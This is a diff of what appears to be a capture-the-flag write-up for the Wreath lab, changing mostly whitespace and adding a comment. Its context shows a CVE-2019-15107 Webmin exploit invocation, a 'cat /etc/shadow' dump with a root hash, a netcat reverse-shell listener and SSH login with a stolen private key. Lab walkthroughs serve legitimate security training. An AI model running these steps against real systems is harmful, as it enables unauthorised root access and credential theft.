@@ -235,7 +235,8 @@
     - ./CVE-2019-15107.py TARGET_IP
 
   - What is Webmin?
-      Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.        Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely, the official website says. 
+     
+     Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.        Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely, the official website says. 
 
    Which user was the server running as?
  
@@ -297,7 +298,7 @@
         cat /etc/shadow
         root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
         ┌──(root💀DESKTOP-7K6I4IF)-[~]
-         └─# nc -lnvp 4444
+        └─# nc -lnvp 4444
          Listening on 0.0.0.0 4444
          Connection received on 10.200.106.200 51376
          sh: cannot set terminal process group (1781): Inappropriate ioctl for device
@@ -345,13 +346,13 @@
                       -----END OPENSSH PRIVATE KEY-----
 
 
-        ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
-        └─# chmod 600 KEY_rsa 
+         ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
+         └─# chmod 600 KEY_rsa 
 
          ┌──(root💀DESKTOP-7K6I4IF)-[~/Documents/Wreath]
          └─#ssh -i 'KEY_rsa' root@IP
 
-         
+         #Victim machine:
          [root@prod-serv tmp]#
 
 
